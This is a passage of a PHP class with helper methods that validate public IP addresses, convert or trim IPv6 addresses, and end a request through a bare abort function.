        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            return false;
        }
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        }else{
            $this->is_ipv6 = true;
        }
        return true;
    }

    public function get_temp_ipv4($ip){
        $newip = explode(":", $ip)[0].explode(":", $ip)[1];
       return hexdec($newip);
    }
    public function get_trimmed_ipv6($ip){
        $newip = explode(":", $ip)[0].":".explode(":", $ip)[1].":".explode(":", $ip)[2].":".explode(":", $ip)[3].":".explode(":", $ip)[4];
        return $newip;
    }

    public function abort($httpcode = 404){
        // http_response_code($httpcode);
        if($httpcode === 404){
            // echo "<h1>404</h1>";
            // echo "<span>Not Found</span>";
            // return view('errors.404');
        }else{
            // return response()->view('errors.503', [], 503);
        }
        exit;
    }

}
